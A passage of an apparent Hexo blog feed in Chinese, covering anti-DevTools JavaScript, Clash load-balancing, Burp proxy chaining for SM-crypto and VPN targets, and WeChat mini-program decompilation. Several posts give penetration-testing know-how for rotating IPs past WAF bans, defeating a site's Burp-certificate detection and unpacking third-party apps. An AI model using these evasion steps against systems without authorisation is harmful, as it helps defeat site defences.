title="禁止先打开控制台后强制进入"></a>禁止先打开控制台后强制进入</h2><p>如果用户在工具栏调起开发者工具，那么判断浏览器的可视高度和可视宽度是否有改变，如有改变则关闭本页面 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//禁止先打开控制台然后强行进入</span><br><span class="line">function a() &#123;</span><br><span class="line">    var domain = window.location.host;// 获取当前域名</span><br><span class="line">    window.location.href = &quot;https://&quot; + domain;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line">if (window.outerHeight - window.innerHeight &gt; 150) &#123;</span><br><span class="line">    a()</span><br><span class="line">&#125;</span><br><span class="line">if (window.outerWidth - window.innerWidth &gt; 150) &#123;</span><br><span class="line">    a()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//禁止右键</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">oncontextmenu</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;  </span><br><span class="line">    event.<span class="title function_">preventDefault</span>();  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听按键</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// f12</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">123</span>) &#123;</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ctrl+shift+i</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">shiftKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">73</span>) &#123;</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ctrl+s</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">83</span>) &#123;</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">// ctrl+p</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">ctrlKey</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> == <span class="number">80</span>) &#123;</span><br><span class="line">        event.<span class="property">keyCode</span> = <span class="number">0</span>;</span><br><span class="line">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//禁止先打开控制台然后强行进入</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;请关闭控制台后再访问本站！！！&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> domain = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">host</span>;<span class="comment">// 获取当前域名</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;https://&quot;</span> + domain;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerHeight</span> - <span class="variable language_">window</span>.<span class="property">innerHeight</span> &gt; <span class="number">150</span>) &#123;</span><br><span class="line">    <span class="title function_">a</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerWidth</span> - <span class="variable language_">window</span>.<span class="property">innerWidth</span> &gt; <span class="number">150</span>) &#123;</span><br><span class="line">    <span class="title function_">a</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hexo一键三连后，查看效果</p><p>执行效果如下：</p><ul><li>右键、特定按键打开Devtools，无反应</li><li>先打开控制台后强制进入，会弹窗，强制关闭devtools</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091645594.png" alt="image-20240409164540557">  </p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客安全 </tag>
            
            <tag> 禁用调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>clash配置负载均衡</title>
      <link href="/2024/04/08/clash%E9%85%8D%E7%BD%AE%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"/>
      <url>/2024/04/08/clash%E9%85%8D%E7%BD%AE%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在使用Clash节点的时候，有时候觉得自己的节点网速跑不满，速度不够快。这时候，我们可以尝试着使用负载均衡，来让节点的网速拉满。在渗透测试的时候，目标站点那边有WAF，操作没几分钟就被客户把IP ban掉了，如果使用clash挂上游代理，可以切换IP，但每次被封一个就切换一次，太麻烦，这块就可以使用负载均衡的方式，一个IP被ban后，直接自动切换下一个IP。。。</p><h2 id="0x01-准备材料"><a href="#0x01-准备材料" class="headerlink" title="0x01 准备材料"></a>0x01 准备材料</h2><ul><li>Clash 节点配置</li><li>基于原版 Clash、Clash Premium 或 Clash Meta 的客户端</li></ul><h2 id="0x02-配置步骤"><a href="#0x02-配置步骤" class="headerlink" title="0x02 配置步骤"></a>0x02 配置步骤</h2><h3 id="CFW-Parsers"><a href="#CFW-Parsers" class="headerlink" title="CFW Parsers"></a>CFW Parsers</h3><ol><li>打开 Clash For Windows，转到“设置”→“配置”。点击“预处理配置”右边的“Edit”按钮：</li></ol><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023662.png" alt="image-20240410102323613">  </p><ol start="2"><li>在内置编辑器中，粘贴以下内容并保存</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">parsers:</span><br><span class="line">  - reg: &#x27;slbable$&#x27;</span><br><span class="line">    yaml:</span><br><span class="line">      append-proxy-groups:</span><br><span class="line">        - name: ⚖️ 负载均衡-散列</span><br><span class="line">          type: load-balance</span><br><span class="line">          url: &#x27;http://www.google.com/generate_204&#x27;</span><br><span class="line">          interval: 300</span><br><span class="line">          strategy: consistent-hashing</span><br><span class="line">        - name: ⚖️ 负载均衡-轮询</span><br><span class="line">          type: load-balance</span><br><span class="line">          url: &#x27;http://www.google.com/generate_204&#x27;</span><br><span class="line">          interval: 300</span><br><span class="line">          strategy: round-robin</span><br><span class="line">      commands:</span><br><span class="line">        - proxy-groups.⚖️ 负载均衡-散列.proxies=[]proxyNames</span><br><span class="line">        - proxy-groups.0.proxies.0+⚖️ 负载均衡-散列</span><br><span class="line">        - proxy-groups.⚖️ 负载均衡-轮询.proxies=[]proxyNames</span><br><span class="line">        - proxy-groups.0.proxies.0+⚖️ 负载均衡-轮询</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023242.png" alt="image-20240410102331198">  </p><ol start="3"><li>为了防止正常订阅被污染，请自行修改订阅地址，在其后面加上#slbable即可使用负载均衡</li></ol><p>在订阅地址后面手动输入：#slbable</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023573.png" alt="image-20240410102338531">  </p><ol start="4"><li>点击确定回到【配置】界面，右击配置项选择【预处理配置】。如果出现如下界面，就代表负载均衡规则已加载成功：</li></ol><p>出现 reg(slbable$) 代表负载均衡规则加载成功</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023311.png" alt="image-20240410102344268">  </p><ol start="5"><li>此时，Clash 已经配置好的节点之间的负载均衡规则。在【代理】-【规则】中出现了【负载均衡-散列】和【负载均衡-轮询】的选项：</li></ol><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023529.png" alt="image-20240410102350484">  </p><p>新增的<strong>【负载均衡-散列】</strong>和<strong>【负载均衡-轮询】</strong>选项卡</p><p>在只需要重启 Clash 并选择好代理，就可以实现负载均衡效果。</p><ol start="6"><li>重启之后，打开【代理】-【规则】，并点击选择【负载均衡-轮询模式】。然后右击窗口右下角的Clash小蓝猫图标，像右侧图片这样选择。选择【系统代理】、然后代理模式选择【规则】。</li></ol><h3 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h3><p>关于<strong>系统代理</strong>、<strong>TUN模式</strong>、<strong>混合配置</strong>这些，新手可以这么理解：</p><ul><li>系统代理：就是浏览页面、看视频之类的走代理（魔法上网）。游戏、应用之类的不会走代理</li><li>TUN 模式：就是无论网页、游戏、应用还是什么全部按照规则走代理（魔法上网）。</li><li>混合模式：就是上面两个混一起用。</li></ul><h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>使用Python脚本来简单测试一下：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&quot;socks5://127.0.0.1:7890&quot;</span>,</span><br><span class="line">           <span class="string">&#x27;https&#x27;</span>: <span class="string">&quot;socks5://127.0.0.1:7890&quot;</span></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">ips = []</span><br><span class="line"><span class="comment"># IP正则表达式，用于提前返回字符串中的IP</span></span><br><span class="line">regex_str = <span class="string">r&quot;\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    response = requests.get(<span class="string">&quot;https://ipinfo.io&quot;</span>, proxies=proxies)</span><br><span class="line">    ip = re.findall(regex_str, response.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> ips:</span><br><span class="line">        ips.append(ip)</span><br><span class="line">        <span class="built_in">print</span>(ip)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101023915.png" alt="image-20240410102358873">  </p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> clash </tag>
            
            <tag> 负载均衡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次国密站点抓包流程</title>
      <link href="/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9B%BD%E5%AF%86%E7%AB%99%E7%82%B9%E6%8A%93%E5%8C%85%E6%B5%81%E7%A8%8B/"/>
      <url>/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9B%BD%E5%AF%86%E7%AB%99%E7%82%B9%E6%8A%93%E5%8C%85%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>目标站点：针对国密站点，此处举例某金融国密站点</p><p>使用工具：GMproxy、burp</p><p>说明：使用GMproxy和burp联动，抓取国密站点的数据包</p><h2 id="0x01-GMproxy说明与使用"><a href="#0x01-GMproxy说明与使用" class="headerlink" title="0x01 GMproxy说明与使用"></a>0x01 GMproxy说明与使用</h2><h3 id="1-说明"><a href="#1-说明" class="headerlink" title="1. 说明"></a>1. 说明</h3><p>为保障重要系统的安全，国家密码管理局要求相应业务系统要做广泛的改造，改用中国标准的公钥密码算法。国密算法的支持已成为业务系统的重要安全保障。</p><p>但随着国密网站的增多，包括很多单位的办公SSL VPN也逐步改造为国密SSL VPN。很多常用浏览器不支持国密SSL网站访问的问题日益突出，如Chrome 、Edge、IE、FireFox火狐 等浏览器均不能访问国密SSL网站。</p><p>“GMProxy”正是来<strong>让任意浏览器支持国密网站的工具</strong>。GMProxy 为绿色软件，下载后解压即可使用。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029361.png" alt="image-20240410102900222">  </p><h3 id="2-软件下载"><a href="#2-软件下载" class="headerlink" title="2. 软件下载"></a>2. 软件下载</h3><p>最新版的GMProxy：<a href="https://www.gmproxy.cn/GMProxy.msi">https://www.gmproxy.cn/GMProxy.msi</a></p><p>软件签名信息为: <strong>北京水熊虫网络科技有限公司</strong>。</p><p>GMProxy.msi SHA1:0b163a967b96a212a16b74083faf78963b35f375</p><h3 id="3-安装证书"><a href="#3-安装证书" class="headerlink" title="3. 安装证书"></a>3. 安装证书</h3><p>帮助–&gt;安装跟证书，安装到 “受信任的根证书安装机构”下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029845.png" alt="image-20240410102913811"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029510.png" alt="image-20240410102919468">  </p><h3 id="4-运行"><a href="#4-运行" class="headerlink" title="4. 运行"></a>4. 运行</h3><p>直接下载后之后，桌面运行快捷方式即可打开：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029502.png" alt="image-20240410102925460"> </p><h3 id="5-编辑网址列表"><a href="#5-编辑网址列表" class="headerlink" title="5. 编辑网址列表"></a>5. 编辑网址列表</h3><p>只有在国密网址列表中的URL 才会启动国密SSL 转换，无论访问HTTP 还是HTTPS ，GMProxy 都会转换成国密https进行访问。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029472.png" alt="image-20240410102931437"> </p><h3 id="6-备注"><a href="#6-备注" class="headerlink" title="6. 备注"></a>6. 备注</h3><p>这个工具使用有时间限制，会涉及到软件激活：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029406.png" alt="image-20240410102935364"> </p><h2 id="0x02-普通浏览器访问国密站点"><a href="#0x02-普通浏览器访问国密站点" class="headerlink" title="0x02 普通浏览器访问国密站点"></a>0x02 普通浏览器访问国密站点</h2><p>“GMProxy”正是来<strong>让任意浏览器支持国密网站的工具</strong>。</p><p>1、当我们不使用GMProxy的时候，使用chrome浏览器，会提示如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029449.png" alt="image-20240410102941397"> </p><p>2、使用GMProxy来访问国密站点</p><p>（1）首先，在浏览器上设置代理，将流量转发到GMProxy（GMProxy默认端口<strong>18080</strong>）</p><p><img src="C:/Users/HONOR/AppData/Roaming/Typora/typora-user-images/image-20240410102946428.png" alt="image-20240410102946428"> </p><p>（2）开启代理，重新访问国密站点，访问成功 </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029426.png" alt="image-20240410102953367"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101029629.png" alt="image-20240410102958572"> </p><h2 id="0x03-burp联动GMProxy"><a href="#0x03-burp联动GMProxy" class="headerlink" title="0x03 burp联动GMProxy"></a>0x03 burp联动GMProxy</h2><p>1、可以通过给BurpSuite 设置<strong>Upstream</strong> 代理 ，实现对国密HTTPS的测试</p><p>（这块将 burp抓到的流量转发到GMProxy）</p><p>User OPtions –&gt; UpStream proxy</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101030083.png" alt="image-20240410103003046"></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101030235.png" alt="image-20240410103009205"> </p><p>2、浏览器正常开启burp代理</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101030629.png" alt="image-20240410103015597"> </p><p>3、成功抓取到国密站点流量，并可以正常访问</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101030545.png" alt="image-20240410103026503"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101030816.png" alt="image-20240410103031752"> </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 抓包 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> burp </tag>
            
            <tag> 国密站点 </tag>
            
            <tag> GMproxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次web站点检测burp证书抓包</title>
      <link href="/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1web%E7%AB%99%E7%82%B9%E6%A3%80%E6%B5%8Bburp%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85/"/>
      <url>/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1web%E7%AB%99%E7%82%B9%E6%A3%80%E6%B5%8Bburp%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>目标站点：某期货公司web站点</p><p>工具：charles、burp</p><p>说明：web站点开启burp后不能访问，但使用Charle抓包正常。</p><h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>1、访问目标地址：可以正常访问</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028089.png" alt="image-20240410102802034">  </p><p>2、开启burp抓包，发现不能成功访问了</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028969.png" alt="image-20240410102807932"> </p><p>3、但是使用charles进行抓包，可以成功抓包并访问</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028019.png" alt="image-20240410102813961"> </p><p>4、所以，猜测当前站点<strong>有对burp证书进行检测</strong>。</p><h2 id="0x02-解决办法"><a href="#0x02-解决办法" class="headerlink" title="0x02 解决办法"></a>0x02 解决办法</h2><p>双层代理屏蔽掉burp证书，让流量从 <strong>浏览器 –&gt; burp –&gt;Charles</strong>：</p><p>1、首先，在burp上配置上游代理，让burp的流量转发到Charles：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028423.png" alt="image-20240410102820377"></p><p>2、浏览器上正常开启burp代理</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028074.png" alt="image-20240410102826031"></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028705.png" alt="image-20240410102834676"></p><p>3、打开Charles，Charles默认监听8888端口：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028678.png" alt="image-20240410102840645"> </p><p>4、重新访问地址，可以成功访问并抓包：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101028384.png" alt="image-20240410102847329">  </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 抓包 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> burp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次VPN不走全局代理抓包解决办法</title>
      <link href="/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1VPN%E4%B8%8D%E8%B5%B0%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E6%8A%93%E5%8C%85%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
      <url>/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1VPN%E4%B8%8D%E8%B5%B0%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E6%8A%93%E5%8C%85%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>站点：内网 web 环境</p><p>访问方式：本地下载VPN连接，访问web站点</p><p>问题：使用burp正常抓包，发现没有响应</p><h3 id="0x01-抓包分析"><a href="#0x01-抓包分析" class="headerlink" title="0x01 抓包分析"></a>0x01 抓包分析</h3><p>1、首先，访问站点，使用burp抓包，发现可以抓到请求包，但没有响应</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026848.png" alt="image-20240410102621701">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026529.png" alt="image-20240410102629496">  </p><p>2、同时，开启burp代理抓包后，web站点不能访问；关闭代理，又可以正常访问：</p><ul><li>关闭代理</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026082.png" alt="image-20240410102635955">  </p><ul><li>开启代理</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026949.png" alt="image-20240410102642920">  </p><p>3、通过wireshark抓包分析，可以看到，当burp抓包重放后，流量不再经过我们的VPN，而是在发送到了当前WIFI所在内网中：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026628.png" alt="image-20240410102651606">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026537.png" alt="image-20240410102657524">  </p><p>这块的 10.xx.xx.48为目标测试地址；10.101.22.62为当前wifi地址。</p><p>4、初步猜测，是easyconnect VPN不是全局代理，只是针对部分exe类应用，如浏览器(chrome.exe)、cmd.exe等做了代理。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027473.png" alt="image-20240410102709452">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027129.png" alt="image-20240410102716102">  </p><h3 id="0x02-解决办法"><a href="#0x02-解决办法" class="headerlink" title="0x02 解决办法"></a>0x02 解决办法</h3><p>使用端口转发工具做端口转发。让流量的一个走向为：浏览器-&gt;burp-&gt;端口转发-&gt;VPN-&gt;服务端</p><ul><li>端口转发工具：ew（其它类似工具也可以）</li><li>转发代理：走socks5代理</li></ul><p>1、使用ew设置全局端口转发</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027828.png" alt="image-20240410102723818">  </p><p>2、burp配置socks代理</p><p>user options –&gt; socks proxy，配置同ew即可</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027392.png" alt="image-20240410102730363">  </p><p>3、浏览器开启http代理，正常请求</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027207.png" alt="image-20240410102736179">  </p><p>4、使用burp成功抓包</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101027630.png" alt="image-20240410102742575">  </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 抓包 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> VPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unveilr反编译微信小程序</title>
      <link href="/2024/04/06/unveilr%E5%8F%8D%E7%BC%96%E8%AF%91%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
      <url>/2024/04/06/unveilr%E5%8F%8D%E7%BC%96%E8%AF%91%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101024241.png" alt="image-20240410102424221">  </p><p>针对与微信小程序，网上的工具比较多，但个人感觉比较好用的是 unveilr.exe。下面针对这个工具主要介绍一下使用方法。</p><h2 id="定位小程序中加载的-wxapkg文件"><a href="#定位小程序中加载的-wxapkg文件" class="headerlink" title="定位小程序中加载的.wxapkg文件"></a>定位小程序中加载的.wxapkg文件</h2><p>1、微信设置中找到文件夹所在位置。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101024205.png" alt="image-20240410102432189">  </p><p>2、定位过去，找到APPlet文件夹，该文件夹下面存放的是小程序加载后的缓存文件。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101024112.png" alt="image-20240410102439099">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101024810.png" alt="image-20240410102446795">  </p><p>3、由于可能之前加载过其他的小程序，在定位目标程序之前，可以将APPlet文件夹下内容清空</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101024280.png" alt="image-20240410102453267">  </p><p>4、加载目标程序，这块以【xxx就业】小程序为例</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025831.png" alt="image-20240410102507813"> </p><p>5、获取到加载的小程序.wxakg文件</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025226.png" alt="image-20240410102515218">  </p><h2 id="unveilr反编译-wxakg文件"><a href="#unveilr反编译-wxakg文件" class="headerlink" title="unveilr反编译.wxakg文件"></a>unveilr反编译.wxakg文件</h2><p>1、使用如下命令，对目标小程序进行反编译</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unveilr.exe &quot;xxxx\Applet\wxff689bf2602ab223\12&quot;   //这块直接写文件夹名称就行，会自动读取加载的</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025538.png" alt="image-20240410102520524">  </p><h2 id="微信开发者助手加载进行调试"><a href="#微信开发者助手加载进行调试" class="headerlink" title="微信开发者助手加载进行调试"></a>微信开发者助手加载进行调试</h2><p>1、成功加载了小程序，但是有个报错：”不在以下 request 合法域名列表中”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025220.png" alt="image-20240410102526174">  </p><p>解决办法：详情-&gt;本地设置，勾选上不校验合法域名：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025042.png" alt="image-20240410102532006">  </p><p>重新加载小程序，发现没有报错了！</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025787.png" alt="image-20240410102537744">  </p><p>2、点击【职位】模块，报错 “ Cannot read property ‘length’ of undefined”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025628.png" alt="image-20240410102543598">  </p><p>解决办法：参考如下链接</p><p><a href="https://developers.weixin.qq.com/community/develop/doc/000e2e36b6c8106a882a514495d000">https://developers.weixin.qq.com/community/develop/doc/000e2e36b6c8106a882a514495d000</a></p><p>使用 res.data.result 前 ，先使用 if(res.data&amp;&amp;res.data.result) 进行空值判断，为真后继续你的逻辑处理。</p><p><a href="https://blog.csdn.net/lily__an/article/details/89226181">https://blog.csdn.net/lily__an/article/details/89226181</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025509.png" alt="image-20240410102549484">  </p><p>按照这种解决办法，可以修改JS中的代码如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101025348.png" alt="image-20240410102556317">  </p><p>重新加载，就会发现不再报错了！</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101026431.png" alt="image-20240410102602390">  </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>排错思路，就是哪里有问题解决哪里的问题。</p><p>这种一般网上找解决办法都是有的，百度就ok！</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 小程序 </tag>
            
            <tag> unveilr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo开始写博客</title>
      <link href="/2024/03/26/hexo%E5%BC%80%E5%A7%8B%E5%86%99%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/03/26/hexo%E5%BC%80%E5%A7%8B%E5%86%99%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h1><p>命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new [layout] title  或  hexo n [layout] title</span><br></pre></td></tr></table></figure><p>创建文章前要先选定模板，在hexo中也叫做布局。hexo支持三种布局（layout）：post(默认)、draft、page。</p><p>这块先介绍如何使用已有布局，后面还将会介绍如何自定义布局。</p><p>在博客目录下输入以下命令时，会默认使用post布局，然后自动在source_posts目录生成一个text.md文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo n text</span><br></pre></td></tr></table></figure><p>当然，也可以执行布局</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo n [layout_name] draft1</span><br></pre></td></tr></table></figure><p>该命令创建了一个使用特定布局的名为draft1的文章。</p><p>打开之前创建的test.md文件，可以看到文章开头包含如下内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: text1</span><br><span class="line">author: luyao</span><br><span class="line">date: 2020-04-10 04:13:36</span><br><span class="line">tags: hexo</span><br><span class="line">categories: blog</span><br><span 